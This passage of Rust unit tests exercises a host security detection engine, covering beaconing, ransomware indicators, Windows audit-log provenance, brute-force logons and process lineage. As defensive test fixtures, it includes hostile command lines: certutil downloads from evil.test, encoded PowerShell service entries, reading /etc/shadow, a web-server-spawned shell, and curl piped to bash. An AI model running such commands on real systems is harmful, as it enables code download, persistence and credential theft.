        assert!(e.inspect(&net_event("93.184.216.34", 443)).is_empty());
        assert!(e.inspect(&proc_event("ls", "/bin/ls", "ls -la")).is_empty());
    }

    #[test]
    fn config_can_disable_and_reenable_sigma_without_dropping_rules() {
        let e = engine();
        e.reload_sigma(&[format!(
            "title: Config switch test\nlogsource:\n  product: {}\n  category: process_creation\ndetection:\n  selection:\n    CommandLine|contains: TRAPD_SIGMA_SWITCH\n  condition: selection\nlevel: high\n",
            std::env::consts::OS
        )]);
        let event = proc_event("test", "test.exe", "TRAPD_SIGMA_SWITCH");
        let sigma_hits = |events: Vec<AgentEvent>| {
            events
                .iter()
                .filter(|ev| matches!(&ev.data, EventData::Detection(d) if d.category == "sigma"))
                .count()
        };
        assert_eq!(sigma_hits(e.inspect(&event)), 1);
        e.set_sigma_enabled(false);
        assert_eq!(sigma_hits(e.inspect(&event)), 0);
        e.set_sigma_enabled(true);
        assert_eq!(sigma_hits(e.inspect(&event)), 1);
    }

    #[test]
    fn flags_imds_access() {
        let e = engine();
        let out = e.inspect(&net_event("169.254.169.254", 80));
        assert!(
            out.iter().any(
                |ev| matches!(&ev.data, EventData::Detection(d) if d.rule_id == "cloud.imds_access")
            ),
            "connection to the cloud metadata endpoint should be flagged"
        );
    }

    #[test]
    fn flags_port_scan_via_engine() {
        let e = engine();
        let mut hit = false;
        for port in 1000..=1020u16 {
            if e.inspect(&net_event("198.51.100.50", port)).iter().any(
                |ev| matches!(&ev.data, EventData::Detection(d) if d.rule_id == "recon.port_scan"),
            ) {
                hit = true;
            }
        }
        assert!(hit, "scanning many ports on one host should be flagged");
    }

    #[test]
    fn does_not_inspect_own_detections() {
        let e = engine();
        let det = e.detection(
            Severity::High,
            DetectionData {
                rule_id: "x".into(),
                title: "t".into(),
                category: "c".into(),
                mitre_tactic: None,
                mitre_technique: None,
                confidence: 50,
                subject: "s".into(),
                detail: "d".into(),
                evidence: serde_json::Value::Null,
                ..Default::default()
            },
        );
        assert!(e.inspect(&det).is_empty());
    }

    #[test]
    fn public_destination_excludes_lan_and_local_ranges() {
        for lan in [
            "10.0.0.36",
            "10.0.0.1",
            "192.168.1.5",
            "172.16.0.9",
            "127.0.0.1",
            "169.254.169.254",
            "100.64.0.1",
            "224.0.0.251",
            "0.0.0.0",
            "::1",
            "fe80::1",
            "fe80::1%12",
            "fd12:3456::1",
            "ff02::fb",
            "::ffff:10.0.0.1",
            "",
            "not-an-ip",
        ] {
            assert!(!is_public_destination(lan), "{lan} must not be public");
        }
        for public in [
            "40.90.8.111",
            "185.22.141.18",
            "2001:4860:4840:400::443",
            "::ffff:8.8.8.8",
        ] {
            assert!(is_public_destination(public), "{public} must be public");
        }
    }

    #[test]
    fn user_writable_path_covers_linux_and_windows() {
        for p in [
            "/tmp/x",
            "/dev/shm/a",
            "C:\\Users\\bob\\AppData\\Local\\Temp\\a.exe",
            "c:\\users\\bob\\appdata\\roaming\\x\\y.exe",
            "C:\\Users\\bob\\Downloads\\a.exe",
            "C:\\Users\\Public\\a.exe",
            "C:\\Windows\\Temp\\a.exe",
        ] {
            assert!(is_user_writable_path(p), "{p}");
        }
        for p in [
            "",
            "/usr/bin/curl",
            "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "C:\\Windows\\System32\\svchost.exe",
        ] {
            assert!(!is_user_writable_path(p), "{p}");
        }
    }

    /// Feed one destination at a fixed cadence through the engine, from a
    /// process running `exe`, and return the beaconing finding, if any.
    fn beacon_through_engine(ip: &str, exe: &str) -> Option<AgentEvent> {
        let e = engine();
        let mut create = proc_event("proc", exe, "");
        if let EventData::ProcessCreate(p) = &mut create.data {
            p.pid = 4242;
        }
        let mut ev = net_event(ip, 443);
        if let EventData::NetworkConnection(n) = &mut ev.data {
            n.pid = Some(4242);
        }
        let t0 = Instant::now();
        e.inspect_at(&create, t0, 0.0);
        let mut found = None;
        for i in 0..8u64 {
            let now = t0 + std::time::Duration::from_secs(i * 60);
            let out = e.inspect_at(&ev, now, (i * 60) as f64);
            found = found.or_else(|| {
                out.into_iter()
                    .find(|f| matches!(&f.data, EventData::Detection(d) if d.rule_id == "beaconing.regular_interval"))
            });
        }
        found
    }

    #[test]
    fn lan_beacons_are_not_reported() {
        // Chromecast (10.0.0.36:8009) and the router (10.0.0.1:49000) from a
        // real host produced "high" C2 alerts before.
        assert!(beacon_through_engine(
            "10.0.0.36",
            "C:\\Program Files\\Google\\Chrome\\chrome.exe"
        )
        .is_none());
        assert!(beacon_through_engine("10.0.0.1", "").is_none());
    }

    #[test]
    fn routine_public_beacon_is_a_low_signal() {
        let f = beacon_through_engine("40.90.8.111", "C:\\Windows\\System32\\svchost.exe")
            .expect("regular public cadence is still observed");
        let EventData::Detection(d) = &f.data else {
            unreachable!()
        };
        assert_eq!(d.mode, Some(DetectionMode::Signal));
        assert!(f.severity <= Severity::Low, "{:?}", f.severity);
    }

    #[test]
    fn beacon_from_user_writable_exe_alerts() {
        let f = beacon_through_engine(
            "185.22.141.18",
            "C:\\Users\\bob\\AppData\\Local\\Temp\\upd.exe",
        )
        .expect("beacon expected");
        let EventData::Detection(d) = &f.data else {
            unreachable!()
        };
        assert_eq!(d.mode, Some(DetectionMode::Alert));
        assert!(f.severity >= Severity::Medium, "{:?}", f.severity);
    }

    fn indicator(kind: &str, path: Option<&str>) -> AgentEvent {
        crate::collectors::fs_heuristics::indicator_event(
            "a",
            "h",
            kind,
            path.map(str::to_string),
            None,
            None,
            format!("{kind} test"),
        )
    }

    fn ransomware_findings_at(e: &DetectionEngine, ev: &AgentEvent, secs: f64) -> Vec<AgentEvent> {
        let now = Instant::now();
        e.inspect_at(ev, now, secs)
            .into_iter()
            .filter(|f| matches!(&f.data, EventData::Detection(d) if d.category == "ransomware"))
            .collect()
    }

    fn ransomware_findings(e: &DetectionEngine, ev: &AgentEvent) -> Vec<AgentEvent> {
        ransomware_findings_at(e, ev, 0.0)
    }

    fn mode_of(f: &AgentEvent) -> DetectionMode {
        let EventData::Detection(d) = &f.data else {
            unreachable!()
        };
        d.mode.expect("finalised finding has a mode")
    }

    #[test]
    fn a_write_burst_alone_is_only_a_signal() {
        // A dev workstation's builds and checkouts cross 50 files / 10 s.
        let e = engine();
        let f = ransomware_findings(&e, &indicator("high_write_rate", None));
        assert_eq!(f.len(), 1);
        assert_eq!(mode_of(&f[0]), DetectionMode::Signal);
        assert!(f[0].severity <= Severity::Low);
    }

    #[test]
    fn write_burst_with_ransom_extension_is_one_alert() {
        // 200 files arrive as four 50-file batches; the gate folds them.
        let e = engine();
        let mut alerts = 0;
        for i in 0..4 {
            let f = ransomware_findings_at(&e, &indicator("high_write_rate", None), i as f64);
            alerts += e
                .admit(f)
                .iter()
                .filter(|x| mode_of(&x.event) == DetectionMode::Alert)
                .count();
        }
        assert_eq!(alerts, 0, "no corroboration yet");
        let f = ransomware_findings_at(
            &e,
            &indicator(
                "suspicious_extension",
                Some("C:\\Users\\bob\\Documents\\a.txt.locked"),
            ),
            5.0,
        );
        assert!(f.iter().any(|x| matches!(&x.data, EventData::Detection(d) if d.rule_id == "ransomware.mass_modification")), "burst re-raised");
        alerts += e
            .admit(f)
            .iter()
            .filter(|x| mode_of(&x.event) == DetectionMode::Alert)
            .count();
        assert!(alerts >= 1);
    }

    #[test]
    fn extension_first_then_write_burst_alerts_too() {
        let e = engine();
        ransomware_findings_at(
            &e,
            &indicator("suspicious_extension", Some("C:\\Users\\bob\\a.txt.locked")),
            1.0,
        );
        let f = ransomware_findings_at(&e, &indicator("high_write_rate", None), 30.0);
        assert_eq!(mode_of(&f[0]), DetectionMode::Alert);
    }

    #[test]
    fn stale_corroboration_does_not_promote_a_burst() {
        let e = engine();
        ransomware_findings_at(
            &e,
            &indicator("suspicious_extension", Some("C:\\Users\\bob\\a.txt.locked")),
            1.0,
        );
        let f = ransomware_findings_at(&e, &indicator("high_write_rate", None), 1.0 + 600.0);
        assert_eq!(mode_of(&f[0]), DetectionMode::Signal);
    }

    #[test]
    fn ransom_extension_burst_in_one_directory_is_one_alert() {
        let e = engine();
        let mut emitted = 0;
        for i in 0..20 {
            let path = format!("C:\\Users\\bob\\Documents\\f{i}.docx.locked");
            let found = ransomware_findings(&e, &indicator("suspicious_extension", Some(&path)));
            let EventData::Detection(d) = &found[0].data else {
                unreachable!()
            };
            assert_eq!(d.rule_id, "ransomware.suspicious_extension");
            emitted += e.admit(found).len();
        }
        assert_eq!(emitted, 1);
    }

    #[test]
    fn backup_deletion_alerts_and_entropy_alone_never_does() {
        let e = engine();
        let f = ransomware_findings(&e, &indicator("backup_deletion", Some("C:\\Backup\\a.bak")));
        let EventData::Detection(d) = &f[0].data else {
            unreachable!()
        };
        assert_eq!(d.rule_id, "ransomware.backup_tamper");
        assert_eq!(d.mode, Some(DetectionMode::Alert));

        let f = ransomware_findings(
            &e,
            &indicator("high_entropy", Some("C:\\Users\\bob\\a.txt")),
        );
        let EventData::Detection(d) = &f[0].data else {
            unreachable!()
        };
        assert_eq!(d.rule_id, "ransomware.high_entropy");
        assert_eq!(d.mode, Some(DetectionMode::Signal));
        assert!(f[0].severity <= Severity::Low);
    }

    #[test]
    fn unknown_indicator_types_are_ignored() {
        assert!(ransomware_findings(&engine(), &indicator("something_new", None)).is_empty());
    }

    fn process_audit_event(command_line: &str) -> AgentEvent {
        let mut fields = serde_json::Map::new();
        fields.insert("EventID".into(), serde_json::json!(4688));
        fields.insert(
            "NewProcessName".into(),
            serde_json::json!("C:\\Windows\\System32\\certutil.exe"),
        );
        fields.insert("CommandLine".into(), serde_json::json!(command_line));
        AgentEvent::new(
            "a".into(),
            "h".into(),
            EventClass::Log,
            EventAction::Log,
            Severity::Info,
            EventData::Log(Box::new(crate::schema::LogEventData {
                source: "windows_eventlog".into(),
                source_type: "windows_eventlog".into(),
                source_path: "Security".into(),
                parser: "windows_eventlog".into(),
                message: String::new(),
                category: "authentication".into(),
                log_timestamp: chrono::DateTime::from_timestamp(1_600_000_000, 0),
                facility: None,
                log_severity: None,
                proc: Some("Microsoft-Windows-Security-Auditing".into()),
                pid: None,
                uid: None,
                username: None,
                log_host: None,
                fields,
                mitre_tactic: None,
                mitre_technique: None,
                offset: None,
                inode: None,
                truncated_fields: None,
            })),
        )
    }

    fn persistence_audit_event(id: u64) -> AgentEvent {
        let mut event =
            process_audit_event("certutil -urlcache -f http://example.test/a C:\\Temp\\a");
        let EventData::Log(log) = &mut event.data else {
            unreachable!()
        };
        log.source_path = if id == 7045 { "System" } else { "Security" }.into();
        log.proc = Some(
            if id == 7045 {
                "Service Control Manager"
            } else {
                "Microsoft-Windows-Security-Auditing"
            }
            .into(),
        );
        log.log_timestamp = chrono::DateTime::from_timestamp(1_600_000_000, 0);
        if id != 4688 {
            log.fields = serde_json::json!({
                "EventID": id, "ServiceName": "evil",
                "ImagePath": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
                "ServiceFileName": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
                "TaskName": "evil", "TaskContent": "<Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=</Arguments></Exec></Actions></Task>"
            }).as_object().unwrap().clone();
        }
        event
    }

    #[test]
    fn native_windows_rules_require_the_event_channel_and_provider() {
        for id in [4688, 7045, 4697, 4698] {
            for mismatch in [
                "channel",
                "provider",
                "missing_provider",
                "missing_time",
                "spoofed_field_provider",
                "generic_file",
            ] {
                let mut event = persistence_audit_event(id);
                let EventData::Log(log) = &mut event.data else {
                    unreachable!()
                };
                match mismatch {
                    "channel" => log.source_path = "Application".into(),
                    "provider" => log.proc = Some("Custom Application".into()),
                    "missing_provider" => log.proc = None,
                    "missing_time" => log.log_timestamp = None,
                    "spoofed_field_provider" => {
                        log.proc = Some("Custom Application".into());
                        log.fields.insert(
                            "Provider".into(),
                            serde_json::json!("Microsoft-Windows-Security-Auditing"),
                        );
                    }
                    "generic_file" => log.source_type = "file".into(),
                    _ => unreachable!(),
                }
                assert!(
                    engine().inspect(&event).is_empty(),
                    "event {id}, wrong {mismatch}"
                );
            }
        }
    }

    fn raw_checkpoint_event(channel: &str) -> AgentEvent {
        let mut event =
            persistence_audit_event(4688).with_source(&format!("windows_eventlog:{channel}"));
        let EventData::Log(log) = &mut event.data else {
            unreachable!()
        };
        log.source_path = channel.into();
        log.fields.clear();
        log.fields
            .insert("src_addr".into(), serde_json::json!("203.0.113.5"));
        event
    }

    #[test]
    fn native_raw_retries_do_not_inflate_finding_gate_counts() {
        let e = engine();
        let now = Instant::now();
        let event = raw_checkpoint_event("Security");
        let first = e.admit_at(e.inspect_at(&event, now, 0.0), now);
        assert_eq!(first.len(), 1);
        assert_eq!(det_of(&first[0].event).occurrence_count, Some(1));
        let retry = e.inspect_at(&event, now, 1.0);
        assert!(
            retry.is_empty(),
            "same native raw UUID must not be analyzed twice"
        );
        assert!(e.admit_at(retry, now).is_empty());
        let mut next = event.clone();
        next.event_id = uuid::Uuid::new_v4();
        assert_eq!(next.timestamp, event.timestamp);
        let findings = e.inspect_at(&next, now, 2.0);
        assert_eq!(
            findings.len(),
            1,
            "new record at equal UTC must be analyzed"
        );
        e.admit_at(findings, now);
        let updates = e.flush_findings_at(now, true);
        assert_eq!(updates.len(), 1);
        assert_eq!(det_of(&updates[0].event).occurrence_count, Some(2));
    }

    #[test]
    fn native_raw_channel_checkpoints_are_independent_and_remember_only_the_last_uuid() {
        let e = engine();
        let mut event = raw_checkpoint_event("Security");
        for channel in [
            "Security",
            "System",
            "Application",
            "Microsoft-Windows-Sysmon/Operational",
        ] {
            event.origin.as_mut().unwrap().source = Some(format!("windows_eventlog:{channel}"));
            let EventData::Log(log) = &mut event.data else {
                unreachable!()
            };
            log.source_path = channel.into();
            assert_eq!(e.inspect(&event).len(), 1, "independent channel {channel}");
            assert!(e.inspect(&event).is_empty(), "retry in channel {channel}");
        }
        let original = event.clone();
        event.event_id = uuid::Uuid::new_v4();
        assert_eq!(e.inspect(&event).len(), 1);
        assert_eq!(
            e.inspect(&original).len(),
            1,
            "only the last source UUID is remembered"
        );
    }

    #[test]
    fn registry_snapshot_retries_are_skipped_but_other_registry_sources_are_not() {
        let e = engine();
        let mut event = AgentEvent::new("a".into(), "h".into(), EventClass::Registry,
            EventAction::Modify, Severity::Info,
            EventData::Registry(crate::schema::RegistryEventData {
                key_path: r"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\app.exe".into(),
                value_name: "Debugger".into(), category: "ifeo".into(), user_sid: None,
                old_value: None, new_value: Some("cmd.exe".into()), rename_from: None, suppressed: None,
            })).with_source("windows_registry_snapshot");
        assert!(!e.inspect(&event).is_empty());
        assert!(
            e.inspect(&event).is_empty(),
            "checkpoint retry must not repeat registry rules"
        );
        event.event_id = uuid::Uuid::new_v4();
        assert!(
            !e.inspect(&event).is_empty(),
            "new registry record at equal UTC is distinct"
        );
        event.origin.as_mut().unwrap().source = Some("windows_eventlog:Security:4657".into());
        assert!(!e.inspect(&event).is_empty());
        assert!(
            !e.inspect(&event).is_empty(),
            "normalized registry events are not raw checkpoints"
        );
    }

    #[test]
    fn raw_checkpoint_filter_does_not_suppress_generic_logs_or_normalized_events() {
        let e = engine();
        let mut generic = raw_checkpoint_event("Security");
        let EventData::Log(log) = &mut generic.data else {
            unreachable!()
        };
        log.source_type = "file".into();
        assert_eq!(e.inspect(&generic).len(), 1);
        assert_eq!(e.inspect(&generic).len(), 1);
        let unknown = raw_checkpoint_event("CustomChannel");
        assert_eq!(e.inspect(&unknown).len(), 1);
        assert_eq!(e.inspect(&unknown).len(), 1);
        let process = AgentEvent::new(
            "a".into(),
            "h".into(),
            EventClass::Process,
            EventAction::Create,
            Severity::Info,
            EventData::ProcessCreate(ProcessCreateData {
                pid: 777,
                name: "certutil.exe".into(),
                exe: r"C:\Windows\System32\certutil.exe".into(),
                cmdline: "certutil -urlcache -f http://example.test/a C:\\Temp\\a".into(),
                ..Default::default()
            }),
        )
        .with_source("windows_eventlog:Security:4688");
        assert!(!e.inspect(&process).is_empty());
        assert!(!e.inspect(&process).is_empty());
        let failure = audit_logon_at(false, 100);
        for _ in 0..3 {
            e.inspect(&failure);
        }
        assert!(
            find(
                &e.inspect(&audit_logon_at(true, 101)),
                "auth.windows_bruteforce_success"
            )
            .is_some(),
            "normalized auth outcomes must not use raw checkpoint slots"
        );
    }

    #[test]
    fn generic_log_network_ioc_rules_survive_windows_provider_gating() {
        let mut event = persistence_audit_event(4688);
        let EventData::Log(log) = &mut event.data else {
            unreachable!()
        };
        log.source_type = "file".into();
        log.fields
            .insert("src_addr".into(), serde_json::json!("203.0.113.5"));
        let findings = engine().inspect(&event);
        assert_eq!(findings.len(), 1);
        assert_eq!(det_of(&findings[0]).rule_id, "ioc.network_ip");
        assert!(!is_historical_windows_record(&findings[0]));
    }

    #[test]
    fn source_less_unknown_windows_records_do_not_infer_native_provenance() {
        for id in [None, Some(9999)] {
            let mut event = persistence_audit_event(4688);
            let EventData::Log(log) = &mut event.data else {
                unreachable!()
            };
            log.fields.clear();
            if let Some(id) = id {
                log.fields.insert("EventID".into(), serde_json::json!(id));
            }
            assert!(windows_rules::eventlog_source(log).is_none());
            assert!(!is_historical_windows_record(&event));
        }
    }

    #[test]
    fn native_windows_log_findings_keep_recorded_source_without_envelope_marker() {
        for id in [4688, 7045, 4697, 4698] {
            let event = persistence_audit_event(id);
            let EventData::Log(log) = &event.data else {
                unreachable!()
            };
            let findings = engine().inspect(&event);
            assert!(!findings.is_empty(), "valid native event {id}");
            for finding in findings {
                assert_eq!(finding.timestamp, log.log_timestamp.unwrap());
                assert_eq!(
                    finding.origin.unwrap().source,
                    Some(format!("windows_eventlog:{}:{id}", log.source_path))
                );
            }
        }
    }

    #[test]
    fn process_audit_command_line_catches_what_etw_could_not_read() {
        // The ETW create for this certutil run arrived with an empty command
        // line; Security 4688 (with command-line auditing) still has it.
        let e = engine();
        let out = e.inspect(&process_audit_event(
            "certutil -urlcache -f http://10.255.255.1/a.txt C:\\Temp\\a.txt",
        ));
        assert!(
            out.iter().any(|f| matches!(&f.data, EventData::Detection(d) if d.rule_id == "lolbin.certutil_download")),
            "{out:?}"
        );
    }

    #[test]
    fn process_audit_without_command_line_or_benign_use_is_quiet() {
        let e = engine();
        assert!(e.inspect(&process_audit_event("")).is_empty());
        assert!(e
            .inspect(&process_audit_event(
                "certutil -hashfile C:\\Install\\setup.msi SHA256"
            ))
            .is_empty());
    }

    #[test]
    fn detects_beacon_over_regular_connections() {
        // Drive the beacon tracker directly with regular timestamps (the engine
        // path uses wall-clock spacing, which is not deterministic in a test).
        let mut t = beaconing::BeaconTracker::new();
        let mut hit = false;
        for i in 0..8 {
            if t.observe("198.51.100.20:8080", i as f64 * 60.0).is_some() {
                hit = true;
            }
        }
        assert!(
            hit,
            "expected a beaconing verdict for a regular 60s cadence"
        );
    }
    // ── Correlation, severity, gate, noise ───────────────────────────────

    fn exec(pid: i32, ppid: i32, uid: u32, comm: &str, exe: &str, cmd: &str) -> AgentEvent {
        AgentEvent::new(
            "a".into(),
            "h".into(),
            EventClass::Process,
            EventAction::Exec,
            Severity::Info,
            EventData::ProcessExec(Box::new(ExecEventData {
                pid,
                ppid,
                uid,
                gid: uid,
                username: if uid == 0 { "root".into() } else { "u".into() },
                comm: comm.into(),
                exe: exe.into(),
                cmdline: cmd.into(),
                cwd: "/".into(),
                process_start_time: Some(1000 + pid as u64),
                ..Default::default()
            })),
        )
    }

    fn det_of(ev: &AgentEvent) -> &DetectionData {
        match &ev.data {
            EventData::Detection(d) => d,
            _ => panic!("not a detection"),
        }
    }

    #[test]
    fn historical_windows_process_never_borrows_reused_pid_context() {
        for source in [
            "windows_eventlog:Security:4688",
            "windows_eventlog:Microsoft-Windows-Sysmon/Operational:1",
        ] {
            let e = engine();
            let now = Instant::now();
            {
                let mut ioa = e.ioa.lock().unwrap();
                ioa.observe(&exec(200, 1, 0, "sshd", "/usr/sbin/sshd", "sshd"), now);
                ioa.observe(&exec(300, 200, 1000, "safe", "/usr/bin/safe", "safe"), now);
            }
            let before = e.ioa.lock().unwrap().context(300).unwrap();
            let mut historical = AgentEvent::new(
                "a".into(), "h".into(), EventClass::Process, EventAction::Create, Severity::Info,
                EventData::ProcessCreate(ProcessCreateData {
                    pid: 300, ppid: 777, name: "powershell.exe".into(),
                    exe: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".into(),
                    cmdline: "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA".into(),
                    username: "DOMAIN\\former".into(), exe_sha256: Some("deadbeef".into()),
                    ..Default::default()
                }),
            ).with_source(source);
            historical.timestamp = chrono::DateTime::parse_from_rfc3339("2020-01-02T03:04:05Z")
                .unwrap()
                .with_timezone(&chrono::Utc);
            let findings = e.inspect_at(&historical, now, 10.0);
            let finding = find(&findings, "execution.powershell_encoded")
                .expect("audit command line remains detectable");
            assert_eq!(finding.timestamp, historical.timestamp);
            let correlation = det_of(finding).correlation.as_ref().unwrap();
            assert!(
                correlation.process_key.is_none(),
                "audit PID must not bind to live generation"
            );
            assert!(correlation.parent_key.is_none());
            assert!(correlation.root_key.is_none());
            assert!(correlation.lineage_keys.is_empty());
            assert_eq!(correlation.pid, Some(300));
            assert_eq!(correlation.user.as_deref(), Some("DOMAIN\\former"));
            assert_eq!(
                correlation.exe.as_deref(),
                Some("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")
            );
            assert!(det_of(finding).evidence.get("process_lineage").is_none());
            assert_eq!(
                finding.origin.as_ref().unwrap().source.as_deref(),
                Some(source)
            );
            assert_eq!(e.ioa.lock().unwrap().context(300).unwrap(), before);
            // Main-loop external admission must not reacquire the live PID.
            let ioc = find(&findings, "ioc.process_hash").unwrap().clone();
            let admitted = e.admit_external_at(ioc, now);
            assert!(!admitted.is_empty());
            for emitted in admitted {
                let d = det_of(&emitted.event);
                assert!(d.correlation.as_ref().unwrap().process_key.is_none());
                assert!(d.correlation.as_ref().unwrap().lineage_keys.is_empty());
                assert!(d.evidence.get("process_lineage").is_none());
            }
            e.ebpf_exec_seen.store(true, Relaxed);
            assert!(
                find(
                    &e.inspect_at(&historical, now, 11.0),
                    "execution.powershell_encoded"
                )
                .is_some(),
                "live telemetry latch must not suppress historical audit detection"
            );
            assert_eq!(e.ioa.lock().unwrap().context(300).unwrap(), before);
        }
    }

    #[test]
    fn historical_windows_raw_log_findings_preserve_provenance_on_admission() {
        let e = engine();
        e.set_rule_modes(&[crate::config::RuleModeOverride {
            rule: "lolbin.certutil_download".into(),
            mode: DetectionMode::Alert,
        }]);
        let now = Instant::now();
        e.ioa
            .lock()
            .unwrap()
            .observe(&exec(300, 1, 1000, "safe", "/usr/bin/safe", "safe"), now);
        let mut audit =
            process_audit_event("certutil -urlcache -f http://evil.test/a.txt C:\\Temp\\a.txt")
                .with_source("windows_eventlog:Security");
        let observed = chrono::DateTime::parse_from_rfc3339("2020-01-02T03:04:05Z")
            .unwrap()
            .with_timezone(&chrono::Utc);
        if let EventData::Log(log) = &mut audit.data {
            log.pid = Some(300); // Provider process, not necessarily the actor.
            log.log_timestamp = Some(observed);
        }
        let findings = e.inspect_at(&audit, now, 10.0);
        let mut finding = find(&findings, "lolbin.certutil_download").unwrap().clone();
        assert_eq!(
            finding.origin.as_ref().unwrap().source.as_deref(),
            Some("windows_eventlog:Security")
        );
        assert_eq!(finding.timestamp, observed);
        // Even a forensic PID added by an external rule cannot bind live context.
        if let EventData::Detection(d) = &mut finding.data {
            d.evidence["pid"] = serde_json::json!(300);
        }
        let admitted = e.admit_external_at(finding, now);
        assert!(!admitted.is_empty());
        for finding in admitted {
            let d = det_of(&finding.event);
            assert!(d.correlation.as_ref().unwrap().process_key.is_none());
            assert!(d.evidence.get("process_lineage").is_none());
        }
    }

    fn audit_logon_at(success: bool, seconds: i64) -> AgentEvent {
        let mut event = AgentEvent::new(
            "a".into(),
            "h".into(),
            EventClass::User,
            EventAction::Logon,
            Severity::Info,
            EventData::UserLogon(crate::schema::UserLogonData {
                username: "alice".into(),
                domain: Some("CORP".into()),
                src_addr: Some("203.0.113.5".into()),
                success,
                logon_type: Some(3),
                ..Default::default()
            }),
        )
        .with_source(if success {
            "windows_eventlog:Security:4624"
        } else {
            "windows_eventlog:Security:4625"
        });
        event.timestamp = chrono::DateTime::from_timestamp(1_600_000_000 + seconds, 0).unwrap();
        event
    }

    #[test]
    fn recorded_windows_logons_do_not_compress_hours_into_collection_time() {
        let e = engine();
        let receipt = Instant::now();
        for i in 0..5 {
            assert!(
                e.inspect_at(&audit_logon_at(false, i * 3600), receipt, 0.0)
                    .is_empty(),
                "hour-separated audit failures must not form a five-minute burst"
            );
        }
        assert!(e
            .inspect_at(&audit_logon_at(true, 5 * 3600), receipt, 0.0)
            .is_empty());
    }

    #[test]
    fn recorded_windows_logon_burst_preserves_evidence_source_and_timestamp() {
        let e = engine();
        let receipt = Instant::now();
        for i in 0..5 {
            e.inspect_at(&audit_logon_at(false, i * 30), receipt, 0.0);
        }
        let success = audit_logon_at(true, 150);
        let findings = e.inspect_at(&success, receipt, 0.0);
        let finding = find(&findings, "auth.windows_bruteforce_success")
            .expect("genuine five-minute audit burst must remain detectable");
        assert!(is_historical_windows_record(finding));
        assert_eq!(finding.timestamp, success.timestamp);
        assert_eq!(
            finding.origin.as_ref().unwrap().source.as_deref(),
            Some("windows_eventlog:Security:4624")
        );
        assert_eq!(
            det_of(finding)
                .correlation
                .as_ref()
                .unwrap()
                .user
                .as_deref(),
            Some("corp\\alice")
        );
        assert!(det_of(finding)
            .correlation
            .as_ref()
            .unwrap()
            .process_key
            .is_none());
    }

    #[test]
    fn recorded_logons_accept_equal_timestamps_and_do_not_mix_live_failures() {
        let e = engine();
        let receipt = Instant::now();
        for _ in 0..2 {
            e.inspect_at(&audit_logon_at(false, 100), receipt, 0.0);
        }
        let mut live_failure = audit_logon_at(false, 0);
        live_failure.origin.as_mut().unwrap().source = Some("windows_process_poll".into());
        e.inspect_at(&live_failure, receipt, 0.0);
        assert!(
            e.inspect_at(&audit_logon_at(true, 100), receipt, 0.0)
                .is_empty(),
            "two recorded failures must not borrow a live failure"
        );
        // Equal event timestamps are common in the same Security batch.
        e.inspect_at(&audit_logon_at(false, 100), receipt, 0.0);
        assert!(find(
            &e.inspect_at(&audit_logon_at(true, 100), receipt, 0.0),
            "auth.windows_bruteforce_success"
        )
        .is_some());
    }

    #[test]
    fn recorded_logon_watermark_rejects_older_records_without_affecting_live_history() {
        let e = engine();
        let receipt = Instant::now();
        for i in 0..3 {
            e.inspect_at(&audit_logon_at(false, 100 + i), receipt, 0.0);
        }
        assert!(
            e.inspect_at(&audit_logon_at(true, 99), receipt, 0.0)
                .is_empty(),
            "later failures cannot justify an earlier successful logon"
        );
        assert!(find(
            &e.inspect_at(&audit_logon_at(true, 103), receipt, 0.0),
            "auth.windows_bruteforce_success"
        )
        .is_some());
        for i in 0..3 {
            let mut live = audit_logon_at(false, i);
            live.origin.as_mut().unwrap().source = Some("windows_process_poll".into());
            e.inspect_at(&live, receipt, i as f64);
        }
        let mut success = audit_logon_at(true, 3);
        success.origin.as_mut().unwrap().source = Some("windows_process_poll".into());
        assert!(
            find(
                &e.inspect_at(&success, receipt, 3.0),
                "auth.windows_bruteforce_success"
            )
            .is_some(),
            "recorded UTC watermark must not discard live elapsed-time events"
        );
    }

    fn find<'a>(out: &'a [AgentEvent], rule: &str) -> Option<&'a AgentEvent> {
        out.iter().find(|e| det_of(e).rule_id == rule)
    }

    #[test]
    fn findings_carry_process_correlation_and_catalog_severity() {
        let e = engine();
        e.inspect(&exec(100, 1, 0, "sshd", "/usr/sbin/sshd", "sshd: u"));
        e.inspect(&exec(200, 100, 0, "bash", "/bin/bash", "-bash"));
        let out = e.inspect(&exec(300, 200, 0, "cat", "/usr/bin/cat", "cat /etc/shadow"));
        let ev = find(&out, "creds.shadow_read").expect("shadow read fires");
        let d = det_of(ev);
        let c = d.correlation.as_ref().unwrap();
        assert!(c.process_key.as_deref().unwrap().ends_with(":300:1300"));
        assert!(c.parent_key.as_deref().unwrap().ends_with(":200:1200"));
        // The login shell below sshd is the session root.
        assert!(c.root_key.as_deref().unwrap().ends_with(":200:1200"));
        assert_eq!(c.exe.as_deref(), Some("/usr/bin/cat"));
        assert_eq!(ev.severity, Severity::Medium, "catalog base, no modifiers");
        assert_eq!(d.mode, Some(DetectionMode::Alert));
        assert!(d
            .dedup_key
            .as_deref()
            .unwrap()
            .starts_with("creds.shadow_read:"));
        assert!(d.context_flags.contains(&"ssh_session".to_string()));
    }

    #[test]
    fn web_lineage_raises_and_package_manager_lowers() {
        let e = engine();
        e.inspect(&exec(
            10,
            1,
            33,
            "nginx",
            "/usr/sbin/nginx",
            "nginx: worker",
        ));
        let out = e.inspect(&exec(11, 10, 33, "sh", "/bin/sh", "sh -c id"));
        let ev = find(&out, "exec.webserver_shell").expect("web shell fires");
        assert_eq!(ev.severity, Severity::Critical, "High base + web lineage");

        let e = engine();
        e.inspect(&exec(
            20,
            1,
            0,
            "apt-get",
            "/usr/bin/apt-get",
            "apt-get install x",
        ));
        e.inspect(&exec(
            21,
            20,
            0,
            "dpkg",
            "/usr/bin/dpkg",
            "dpkg --configure",
        ));
        let out = e.inspect(&exec(
            22,
            21,
            0,
            "sh",
            "/bin/sh",
            "sh -c curl -fsSL https://x/install.sh | bash",
        ));
